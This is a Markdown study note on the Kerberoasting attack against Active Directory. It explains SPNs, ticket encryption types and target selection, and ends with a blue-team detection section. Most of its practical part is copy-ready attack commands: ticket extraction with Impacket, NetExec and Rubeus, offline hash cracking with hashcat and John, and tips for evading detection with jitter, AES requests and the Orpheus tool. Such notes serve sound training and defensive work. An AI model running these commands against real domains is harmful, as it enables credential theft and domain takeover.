# 📌 Kerberoasting Deep Dive

> Any authenticated domain user can request a TGS for any SPN — and that ticket is encrypted with the service account's password hash. Take it offline, crack it, own the account. No exploits, no noise, just Kerberos working as designed.

---

## 🔍 Definition

Kerberoasting is a post-exploitation credential attack (MITRE T1558.003) that exploits Kerberos service ticket encryption to recover service account plaintext passwords. An attacker with any valid domain credential requests TGS tickets for accounts with SPNs. Those tickets are encrypted with the service account's NTLM hash — the attacker extracts them and cracks them offline. No account lockout, no elevated privileges needed, no interaction with the target service. It's working-as-intended abuse.

---

## 🧠 Core Concepts

- **SPN (Service Principal Name)** — unique identifier tied to a service account (e.g., `MSSQLSvc/db.corp.local:1433`). Any account with an SPN is Kerberoastable
- **TGS ticket** — issued by the KDC for a specific service. Encrypted with the **service account's NTLM hash** — this is what you crack
- **RC4 (etype 23, `$krb5tgs$23$`)** — weaker, default encryption. Cracks at billions of guesses/second on modern GPUs
- **AES128 (etype 17, `$krb5tgs$17$`)** — stronger. Slower to crack
- **AES256 (etype 18, `$krb5tgs$18$`)** — strongest. Requires `msDS-SupportedEncryptionTypes` to have AES enabled on the account
- **RC4 Downgrade** — tools like GetUserSPNs.py and Rubeus can force the KDC to issue RC4-encrypted tickets even when the account supports AES — making cracking faster. Detection: Event ID 4769 with encryption type 0x17
- **gMSA/dMSA** — Group/Delegated Managed Service Accounts. 240-char random auto-rotating passwords. Immune to Kerberoasting — cracking is infeasible
- **Machine accounts** — have long random passwords auto-rotated every 30 days. Not worth Kerberoasting
- **Password last set** — service accounts with old `pwdLastSet` = likely weak password, likely forgotten = best targets
- **adminCount=1 + SPN** — service account in a privileged group with an SPN = highest priority target

---

## ⚙️ How It Works (Step by Step)

1. **Enumerate SPNs** — query AD via LDAP for all user accounts with `servicePrincipalName` attribute set
2. **Filter targets** — prioritize: old passwords, high-priv groups, user accounts (not machine accounts)
3. **Request TGS** — use your valid domain TGT to request a TGS for each target SPN. The KDC issues it without checking if you're authorized to access that service
4. **Extract the ticket** — the TGS blob is returned in the TGS-REP. Extract the encrypted portion (`$krb5tgs$...`)
5. **Offline crack** — brute force / dictionary attack the hash. No lockout, no DC involvement, completely offline
6. **Use the creds** — log in as the service account, potentially pivot to DA if it's privileged

> 💡 The KDC doesn't log what you do with the ticket — it just logs that a ticket was requested (Event ID 4769). That's the only detection window.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| `$krb5tgs$23$` | RC4-encrypted TGS hash — fastest to crack |
| `$krb5tgs$17$` | AES128-encrypted TGS hash |
| `$krb5tgs$18$` | AES256-encrypted TGS hash |
| RC4 downgrade | Forcing RC4-encrypted ticket even when AES is supported |
| Event ID 4769 | Kerberos service ticket requested — logged on DC. Encryption type field reveals RC4 downgrade |
| msDS-SupportedEncryptionTypes | Attribute defining which etypes an account supports |
| Orpheus | TrustedSec tool (Mar 2025) to bypass Kerberoasting detections — AES request + custom ticket options |
| opsec Kerberoast | Requesting tickets that look like normal traffic: AES encryption, specific ticket option flags |
| pwdLastSet | Password last set timestamp — old date = likely weak/forgotten password |
| gMSA | Group Managed Service Account — immune to Kerberoasting (random 240-char password) |

---

## 🔥 Important Details & Gotchas

- **RC4 deprecation incoming** — Microsoft is deprecating RC4_HMAC_MD5 in Windows 11 24H2 and Windows Server 2025. Environments running these will be AES-only. RC4 downgrade attacks will fail. But most orgs are still on older configs
- **RC4 downgrade = detection trigger** — many EDRs and MDI (Microsoft Defender for Identity) alert on RC4 ticket requests (Event ID 4769, etype 0x17) when the account supports AES. Use Rubeus `/rc4opsec` or Orpheus to request AES instead
- **AES hashes are still crackable** — just slower. PBKDF2-based, so weak passwords still fall. RC4 is just much faster (100B+ guesses/sec on modern GPUs)
- **AES256 configured but still getting RC4 hash?** — common gotcha. If the account's password hasn't been changed after AES was enabled, the old RC4 key material still exists. `$krb5tgs$23$` will come back even though the account shows AES support. The fix is to reset the password after enabling AES
- **Don't roast everything blindly** — requesting tickets for every SPN is very noisy. A sudden burst of Event ID 4769 from one IP = instant MDI alert. Target selectively: old passwords, high-priv accounts
- **Service accounts in Domain Admins** — still happens. If `svc_backup` is in DA and has an SPN with a 2018 password → crack it and you're DA
- **Machine accounts have SPNs but are useless** — `HOST/WORKSTATION01$` type SPNs come from machine accounts with 30-day auto-rotating passwords. Skip them
- **Ascension Health breach (May 2024)** — attackers abused RC4 Kerberoasting to crack service account passwords, leading to full ransomware deployment across hospitals. U.S. Senator Ron Wyden pressed FTC to investigate Microsoft's security defaults off the back of this

---

## 🌍 Real-World Usage / Examples

**Enumerate Kerberoastable accounts (no tickets yet):**
```bash
# Impacket — list all SPNs with metadata
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP>

# Target specific user
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP> -request-user svc_mssql

# With hash instead of password
impacket-GetUserSPNs corp.local/user -hashes :ntlmhash -dc-ip <DC-IP>

# Netexec — enumerate and dump in one shot
nxc ldap <DC-IP> -u user -p pass --kerberoast kerberoast.hashes
```

**Request and save tickets (Impacket):**
```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP> -request -outputfile kerberoast.hashes

# Output format:
# $krb5tgs$23$*svc_mssql$CORP.LOCAL$corp.local/svc_mssql*$...
```

**Rubeus (Windows-side) — standard roast:**
```cmd
# All Kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Only RC4 accounts (skip AES-only → faster cracking)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4

# Only AES accounts (stealthier — blends with normal traffic)
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes

# Target specific user
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql.hash

# Opsec: delay between requests + jitter to avoid burst detection
.\Rubeus.exe kerberoast /outfile:hashes.txt /delay:500 /jitter:50
```

**Cracking with Hashcat:**
```bash
# RC4 (etype 23) — mode 13100
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt

# AES128 (etype 17) — mode 19600
hashcat -m 19600 hashes.aes /usr/share/wordlists/rockyou.txt

# AES256 (etype 18) — mode 19700
hashcat -m 19700 hashes.aes /usr/share/wordlists/rockyou.txt

# With rules (better coverage)
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper alternative
john --format=krb5tgs kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**Opsec Kerberoasting with Orpheus (bypass detection):**
```bash
# Orpheus modifies Impacket to use AES + normal ticket option flags (0x40810000)
# Blends in with legitimate TGS traffic
# https://github.com/trustedsec/Orpheus
python3 orpheus.py -u user -p pass -d corp.local -dc-ip <DC-IP>
```

**PowerView (Windows — enum only):**
```powershell
Get-DomainUser -SPN -Properties sAMAccountName,servicePrincipalName,pwdLastSet,memberof
# Sort by pwdLastSet to find oldest (most likely weak) passwords
```

**Prioritize targets:**
```bash
# From Impacket output, look for:
# - PasswordLastSet > 1 year ago
# - MemberOf: Domain Admins, Backup Operators, etc.
# - Description: may contain the password itself (sysadmin laziness)
```

---

## 🕵️ Detection (Blue Team)

| Signal | Details |
|--------|---------|
| Event ID 4769 | TGS requested. Filter: etype=0x17 (RC4), not krbtgt, not machine accounts |
| Burst of 4769s | Multiple SPNs requested from one IP in seconds = spray |
| RC4 when AES expected | Account supports AES but RC4 ticket issued = downgrade attempt |
| Non-Windows source IP | Impacket from Linux generates slightly different Kerberos traffic |

```powershell
# Blue team hunt — find all RC4 TGS requests
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
  ($_.Message -notmatch 'krbtgt') -and
  ($_.Message -notmatch '\$$') -and
  ($_.Message -match 'Failure Code:\s+0x0') -and
  ($_.Message -match 'Ticket Encryption Type:\s+0x17')
} | Select-Object -ExpandProperty Message
```

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[Active Directory (AD)]]
- [[AS-REP Roasting]]
- [[Delegation Attacks (Constrained, Unconstrained)]]
- [[BloodHound & Attack Path Analysis]]
- [[Lateral Movement]]
- [[gMSA and dMSA Accounts]]

---

## 📚 Sources / Further Reading

- [HackTricks — Kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast) — definitive command reference
- [TrustedSec — Orpheus (Mar 2025)](https://trustedsec.com/blog/the-art-of-bypassing-kerberoast-detections-with-orpheus) — AES-based opsec Kerberoasting
- [Netwrix — Kerberoasting 2025](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/kerberoasting/) — RC4 deprecation timeline
- [BlackFog — Kerberoasting Explained](https://www.blackfog.com/kerberoasting-attack-explained/) — Ascension breach coverage
- [Compass Security — Kerberoasting Deep Dive (Feb 2025)](https://www.compass-security.com/fileadmin/Research/Presentations/2025_02_Kerberos_Deep_Dive_P2_Kerberoasting.pdf) — presentation slides
- HTB Machines: `Active` (classic Kerberoast to DA), `Sauna`
- MITRE ATT&CK: T1558.003
